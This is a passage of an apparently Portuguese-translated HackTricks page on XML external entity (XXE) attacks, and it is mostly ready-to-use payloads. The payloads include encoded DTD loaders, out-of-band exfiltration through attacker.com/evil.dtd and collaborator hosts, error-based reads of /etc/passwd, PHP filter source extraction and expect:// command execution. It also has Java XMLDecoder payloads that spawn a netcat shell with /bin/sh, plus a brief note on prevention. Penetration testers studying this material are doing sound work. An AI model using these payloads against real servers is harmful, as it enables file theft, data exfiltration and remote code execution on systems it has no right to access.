Se a web estiver usando Java, voc√™ pode verificar o [**protocolo jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entidades HTML

Truque de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Voc√™ pode criar uma **entidade dentro de uma entidade** codificando-a com **entidades html** e ent√£o cham√°-la para **carregar um dtd**.\
Observe que as **Entidades HTML** usadas precisam ser **num√©ricas** (como \[neste exemplo]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Exemplo de DTD:
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Inv√≥lucros PHP

### Base64

**Extrair** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extrair recurso externo**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Execu√ß√£o remota de c√≥digo

**Se o m√≥dulo "expect" do PHP estiver carregado**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

XML External Entity (XEE) attacks can also be performed on SOAP web services. In a SOAP message, XML is used to structure the data being sent between the client and the server. By injecting malicious XML entities into the SOAP request, an attacker can exploit vulnerable XML parsers on the server to disclose sensitive information or perform other malicious actions.

### **Detecting XEE in SOAP Messages**

To detect XEE vulnerabilities in SOAP messages, you can send a SOAP request with a crafted XML payload containing external entities. By observing the server's response, you can determine if the XML parser is vulnerable to XEE attacks.

### **Preventing XEE Attacks**

To prevent XEE attacks in SOAP web services, ensure that the XML parser is configured securely. Disable external entity processing or use a secure XML parser that does not resolve external entities. Input validation and sanitization are also crucial to prevent malicious XML payloads from being processed by the server.
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Este exemplo √© inspirado em [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) √© utilizado para padronizar a troca de dados nos processos de localiza√ß√£o. √â um formato baseado em XML usado principalmente para transferir dados localiz√°veis entre ferramentas durante a localiza√ß√£o e como um formato de troca comum para ferramentas de TAC (Tradu√ß√£o Assistida por Computador).

### An√°lise de Solicita√ß√£o Cega

Uma solicita√ß√£o √© feita ao servidor com o seguinte conte√∫do:
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
No entanto, esta solicita√ß√£o desencadeia um erro interno do servidor, mencionando especificamente um problema com as declara√ß√µes de marca√ß√£o:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Apesar do erro, um hit √© registrado no Burp Collaborator, indicando algum n√≠vel de intera√ß√£o com a entidade externa.

Exfiltra√ß√£o de Dados Fora de Banda
Para exfiltrar dados, √© enviada uma solicita√ß√£o modificada:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Este m√©todo revela que o User Agent indica o uso do Java 1.8. Uma limita√ß√£o observada nesta vers√£o do Java √© a incapacidade de recuperar arquivos contendo um caractere de nova linha, como /etc/passwd, usando a t√©cnica Out of Band.

Exfiltra√ß√£o de Dados Baseada em Erros
Para superar essa limita√ß√£o, √© empregada uma abordagem baseada em erros. O arquivo DTD √© estruturado da seguinte forma para acionar um erro que inclui dados de um arquivo alvo:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
O servidor responde com um erro, refletindo a inexist√™ncia do arquivo, indicando que o servidor est√° tentando acessar o arquivo especificado:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Para incluir o conte√∫do do arquivo na mensagem de erro, o arquivo DTD √© ajustado:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Esta modifica√ß√£o leva √† exfiltra√ß√£o bem-sucedida do conte√∫do do arquivo, conforme refletido na sa√≠da de erro enviada via HTTP. Isso indica um ataque bem-sucedido de XXE (Entidade Externa XML), aproveitando t√©cnicas Out of Band e Error-Based para extrair informa√ß√µes sens√≠veis.


## RSS - XEE

XML v√°lido com formato RSS para explorar uma vulnerabilidade de XXE.

### Ping de retorno

Solicita√ß√£o HTTP simples para o servidor do atacante
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler arquivo

Para ler um arquivo remoto, voc√™ pode usar a seguinte estrutura XML com uma entidade externa:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

Isso far√° com que o conte√∫do do arquivo `/etc/passwd` seja exibido na resposta XML.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler c√≥digo fonte

Usando filtro base64 do PHP
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE para RCE

XMLDecoder √© uma classe Java que cria objetos com base em uma mensagem XML. Se um usu√°rio malicioso conseguir fazer com que um aplicativo use dados arbitr√°rios em uma chamada ao m√©todo **readObject**, ele instantaneamente obter√° execu√ß√£o de c√≥digo no servidor.

### Usando Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

O `ProcessBuilder` √© uma classe em Java que √© usada para criar processos filhos. Ele fornece uma maneira mais flex√≠vel de lidar com processos do que diretamente usando `Runtime.exec()`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Ferramentas

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Mais recursos

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extrair informa√ß√µes via HTTP usando DTD externo pr√≥prio: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
